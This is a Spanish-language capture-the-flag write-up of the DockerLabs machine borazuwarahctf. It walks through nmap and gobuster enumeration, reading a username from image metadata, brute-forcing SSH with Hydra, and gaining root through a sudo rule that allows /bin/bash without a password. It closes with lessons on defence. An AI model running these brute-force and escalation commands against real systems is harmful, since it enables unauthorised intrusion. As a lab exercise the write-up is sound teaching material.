# 🛡️ Writeup – borazuwarahctf (Dockers Labs)

Este documento describe el proceso de resolución del desafío **borazuwarahctf** de **Dockers Labs**, mostrando las técnicas utilizadas durante el análisis de la máquina vulnerable hasta obtener acceso completo al sistema.

---

# 1️⃣ Información General

| Campo | Información |
|------|-------------|
| Nombre | borazuwarahctf |
| Dificultad | Muy Fácil |
| IP objetivo | 172.17.0.2 |
| Plataforma | Dockers Labs |

### 🎯 Objetivo

Analizar la máquina vulnerable utilizando técnicas de **reconocimiento, enumeración y explotación**, con el fin de obtener acceso al sistema y posteriormente **escalar privilegios hasta el usuario root**.

La metodología utilizada sigue las fases típicas de un **Pentest / CTF**:

1. Reconocimiento
2. Enumeración
3. Identificación del vector de ataque
4. Explotación
5. Escalada de privilegios

---

# 2️⃣ Reconocimiento

La primera fase consiste en identificar **puertos abiertos y servicios disponibles** en la máquina objetivo.

Para ello se utiliza **Nmap**, una herramienta ampliamente utilizada en auditorías de seguridad.

```bash
nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
📊 Resultado del escaneo
┌──(dadnet㉿DadNet)-[~]
└─$ nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2

Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.59 (Debian)
📌 Servicios detectados
Puerto	Servicio	Versión
22	SSH	OpenSSH 9.2p1
80	HTTP	Apache 2.4.59
🔎 Interpretación

El servidor expone dos servicios principales:

SSH (Puerto 22) → permite acceso remoto al sistema.

HTTP (Puerto 80) → servidor web Apache.

En muchos desafíos CTF el vector inicial suele encontrarse en el servicio web, por lo que el siguiente paso es analizar el contenido disponible en el puerto 80.

3️⃣ Análisis del servicio Web

Al acceder a la dirección:

http://172.17.0.2

se observa únicamente una imagen de un huevo Kinder Sorpresa, sin texto adicional ni funcionalidades visibles.

No se identifican:

Formularios

Panel de login

Scripts visibles

Directorios accesibles

Aplicaciones web

🧠 Hipótesis

En desafíos CTF es común que páginas aparentemente simples oculten información.

Esto puede indicar la presencia de:

Metadatos ocultos

Esteganografía

Archivos ocultos

Información en el código fuente

Por lo tanto, el siguiente paso consiste en realizar enumeración de directorios.

4️⃣ Enumeración Web

Para buscar archivos o directorios ocultos se utilizó la herramienta Gobuster.

gobuster dir -u http://172.17.0.2 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,js,txt
📊 Resultado
.htaccess (Status: 403)
.htpasswd (Status: 403)
index.html (Status: 200)
server-status (Status: 403)
📌 Interpretación

Los resultados muestran:

index.html

archivos protegidos con 403 Forbidden

Esto indica que no existen rutas web explotables visibles.

Dado que la página principal solo contiene una imagen, se plantea la hipótesis de que la información relevante podría encontrarse dentro del propio archivo de imagen.

5️⃣ Análisis de la Imagen

Se descargó la imagen y se analizaron sus metadatos utilizando la herramienta ExifTool.

exiftool imagen.jpeg
📊 Resultado
Description : ---------- User: borazuwarah ----------
Title       : ---------- Password: ----------
🔎 Interpretación

Los metadatos revelan credenciales ocultas dentro de la imagen.

User: borazuwarah
Password: ****

Esto indica que el archivo de imagen contiene información sensible utilizada para el acceso al sistema.

Este tipo de vulnerabilidad ocurre cuando los desarrolladores publican archivos sin revisar los metadatos, lo que puede exponer información crítica.

6️⃣ Ataque al servicio SSH

Con el usuario identificado, se procede a verificar posibles contraseñas utilizando Hydra, una herramienta de fuerza bruta.

hydra -l borazuwarah -P claves.txt ssh://172.17.0.2 -I -f
📊 Resultado
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456

Se ha encontrado una contraseña válida, permitiendo autenticarse en el sistema.

7️⃣ Acceso al sistema

Se inicia sesión mediante SSH utilizando las credenciales obtenidas.

ssh borazuwarah@172.17.0.2
Resultado
borazuwarah@01cedca9af42:~$ whoami
borazuwarah

Se obtiene acceso al sistema como usuario borazuwarah.

8️⃣ Escalada de privilegios

Para verificar posibles privilegios elevados se ejecuta:

sudo -l
Resultado
(ALL) NOPASSWD: /bin/bash

Esto significa que el usuario puede ejecutar /bin/bash como root sin necesidad de contraseña.

🚨 Explotación
sudo bash

Verificación:

whoami

Resultado:

root

Se obtiene acceso completo al sistema.

9️⃣ Conclusión

La máquina presenta varias debilidades de seguridad que permiten comprometer completamente el sistema.

🔴 Vulnerabilidades identificadas
Vulnerabilidad	Impacto
Credenciales en metadatos	Filtración de información sensible
Falta de revisión de archivos publicados	Exposición de datos
Configuración insegura de sudo	Escalada directa a root
⛓️ Cadena de ataque
Reconocimiento
      ↓
Escaneo Nmap
      ↓
Análisis Web
      ↓
Imagen sospechosa
      ↓
Extracción de metadatos
      ↓
Obtención de credenciales
      ↓
Acceso SSH
      ↓
Configuración insegura de sudo
      ↓
ROOT
📚 Lecciones de seguridad

Este desafío demuestra la importancia de:

revisar los metadatos de los archivos antes de publicarlos

evitar almacenar credenciales en archivos públicos

aplicar el principio de mínimo privilegio

configurar correctamente los permisos sudo

Una pequeña mala configuración puede permitir el compromiso completo del sistema.

✍️ Autor: Raúl Bustamante
🎓 Ingeniería Informática
🔐 Intereses: Ciberseguridad, Pentesting, CTF
